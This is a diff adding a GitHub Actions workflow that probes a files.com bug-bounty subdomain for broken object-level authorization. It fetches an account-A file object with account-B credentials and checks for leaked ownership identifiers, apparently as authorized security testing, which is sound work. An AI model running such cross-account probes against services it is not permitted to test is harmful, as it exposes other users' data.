@@ -1,0 +1,123 @@
+name: Files API Two-Account BOLA Probe
+
+on:
+  push:
+    paths:
+      - ".github/workflows/files-api-bola-probe.yml"
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 7
+    env:
+      BASE: https://bugbountytrialcompany1219.files.com
+      AUTH_A: ${{ secrets.AUTHZ_HEADER_A }}
+      AUTH_B: ${{ secrets.AUTHZ_HEADER_B }}
+    steps:
+      - name: Verify authorization contexts are present
+        shell: bash
+        run: |
+          set -euo pipefail
+          if [ -z "${AUTH_A:-}" ] || [ -z "${AUTH_B:-}" ]; then
+            printf '{"status":"skipped","reason":"AUTHZ_HEADER_A/AUTHZ_HEADER_B secrets not configured"}\n' > bola-probe.json
+            cat bola-probe.json
+            exit 0
+          fi
+
+      - name: Run one-object cross-account authorization check
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import json, os, re, subprocess, urllib.parse, pathlib
+
+          base = os.environ["BASE"].rstrip("/")
+          a = os.environ["AUTH_A"]
+          b = os.environ["AUTH_B"]
+
+          def parse_header(value):
+              name, raw = value.split(":", 1)
+              return name.strip(), raw.strip()
+
+          an, av = parse_header(a)
+          bn, bv = parse_header(b)
+
+          def curl(url, name, value):
+              p = subprocess.run(
+                  ["curl","-sS","--max-time","15","--max-redirs","0",
+                   "-H",f"{name}: {value}",
+                   "-H","Accept: application/json",
+                   "-D","/tmp/h","-o","/tmp/b",url],
+                  text=True, capture_output=True
+              )
+              h = pathlib.Path("/tmp/h").read_text(errors="replace") if pathlib.Path("/tmp/h").exists() else ""
+              body = pathlib.Path("/tmp/b").read_text(errors="replace") if pathlib.Path("/tmp/b").exists() else ""
+              status = next((m.group(1) for m in re.finditer(r"^HTTP/[^ ]+ (\d+)", h, re.M)), "000")
+              return int(status), body
+
+          list_url = base + "/api/rest/v1/folders/" + urllib.parse.quote("", safe="") + ".json?path=&per_page=20"
+          sa, body_a = curl(list_url, an, av)
+
+          result = {"target":base,"list_status_a":sa,"candidate":None}
+          if not (200 <= sa < 300):
+              result["reason"]="Account A could not enumerate its own root path."
+          else:
+              try:
+                  items = json.loads(body_a)
+              except Exception:
+                  items = []
+
+              candidate = None
+              if isinstance(items, list):
+                  for item in items:
+                      if isinstance(item, dict) and item.get("path") and item.get("type") in {"file","directory"}:
+                          candidate = item
+                          break
+
+              if not candidate:
+                  result["reason"]="No file/folder object with a concrete path was exposed to Account A."
+              else:
+                  path = str(candidate["path"])
+                  object_id = str(candidate.get("id") or candidate.get("path"))
+                  object_url = base + "/api/rest/v1/folders/" + urllib.parse.quote(path, safe="") + ".json?path=" + urllib.parse.quote(path, safe="")
+                  sa2, body_a2 = curl(object_url, an, av)
+                  sb2, body_b2 = curl(object_url, bn, bv)
+
+                  owner_tokens=[]
+                  for m in re.finditer(r'(?i)"(?:user_id|user_uuid|owner_id|account_id|workspace_id|site_id)"\s*:\s*"?([A-Za-z0-9._:-]+)"?', body_a2[:200000]):
+                      owner_tokens.append(m.group(1))
+                  reproduced=[tok for tok in dict.fromkeys(owner_tokens) if re.search(r'(?<![A-Za-z0-9])'+re.escape(tok)+r'(?![A-Za-z0-9])',body_b2[:200000])]
+
+                  result.update({
+                      "object_path":path,
+                      "object_identifier":object_id,
+                      "object_status_a":sa2,
+                      "object_status_b":sb2,
+                      "same_object_identifier_in_b": object_id in body_b2,
+                      "ownership_binding_reproduced": bool(reproduced),
+                      "ownership_binding_count": len(reproduced),
+                  })
+
+                  if 200 <= sb2 < 300 and object_id in body_b2 and reproduced:
+                      result["candidate"]={
+                          "type":"BOLA",
+                          "url":object_url,
+                          "status_a":sa2,
+                          "status_b":sb2,
+                          "ownership_binding":"reproduced"
+                      }
+                      print("DEMONSTRATED_BOLA_CANDIDATE")
+                  else:
+                      result["reason"]="Account B did not reproduce the exact A-owned object with a strong ownership binding."
+
+          pathlib.Path("bola-probe.json").write_text(json.dumps(result,indent=2)+"\n")
+          print(json.dumps(result,indent=2))
+          PY
+
+      - name: Upload redacted BOLA evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: files-api-bola-probe
+          path: bola-probe.json
